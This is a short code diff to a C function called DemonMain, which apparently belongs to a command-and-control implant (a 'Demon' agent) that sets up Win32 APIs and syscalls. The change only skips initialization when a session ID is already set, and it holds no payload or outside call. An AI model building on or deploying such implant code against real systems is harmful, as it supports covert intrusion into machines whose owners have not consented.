@@ -11,7 +11,8 @@ _Noreturn VOID DemonMain( PVOID ModuleInst )
     Instance->Session.ModuleBase = ModuleInst;
 
     // Initialize Win32 api, Syscalls, Basic user data.
-    DxInitialization();
+    if ( Instance->Session.DemonID == 0 )
+        DxInitialization();
 
     // Our main loop.
     do
